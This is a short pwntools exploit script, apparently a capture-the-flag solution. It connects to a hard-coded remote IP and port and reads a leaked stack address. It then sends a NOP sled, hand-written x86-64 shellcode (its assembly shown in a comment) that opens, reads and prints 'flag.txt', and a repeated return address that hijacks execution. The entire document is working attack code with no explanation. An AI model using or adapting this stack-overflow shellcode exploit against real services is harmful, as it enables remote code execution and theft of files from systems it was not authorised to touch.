from pwn import *
import binascii

context(arch='amd64', os='linux', log_level='info')
s = remote('18.234.102.122', 9004)
addr = int((s.recv(100)))
print('Address: {:02x}'.format(addr))

x = b''

payload = b'\x31\xF6\xF7\xE6\x52\x48\xB9\x66\x6C\x61\x67\x2E\x74\x78\x74\x51\x54\x5F\xB0\x02\x0F\x05\x50\x5F\x54\x5E\x52\x52\x52\x52\x58\x66\xBA\x99\x09\x0F\x05\x5F\xFF\xC7\x50\x5A\x58\xFF\xC0\x0F\x05\x58\xB0\x3C\x0F\x05'

'''
_start:
filename:
    xor %esi, %esi
    mul %esi
    push %rdx
    mov %rcx, 0x7478742e67616c66
    push %rcx
openfile:
    push %rsp
    pop %rdi
    mov %al, 0x2
    syscall
readfile:
    push %rax
    pop %rdi
    push %rsp
    pop %rsi
    push %rdx
    push %rdx
    push %rdx
    push %rdx
    pop %rax
    mov %dx, 0x999
    syscall
write:
    pop %rdi
    inc %edi
    push %rax
    pop %rdx
    pop %rax
    inc %eax
    syscall
leave:
    pop %rax
    mov %al, 60
    syscall
'''

x += payload

frontSledSize = 50;
x = asm(pwnlib.shellcraft.amd64.nop()) * frontSledSize + x

middleSledSize = 50;
x += asm(pwnlib.shellcraft.amd64.nop()) * middleSledSize

x += p64(addr) * 100

log.info('Sending payload...')

s.send(x)
s.clean_and_log()
s.close()
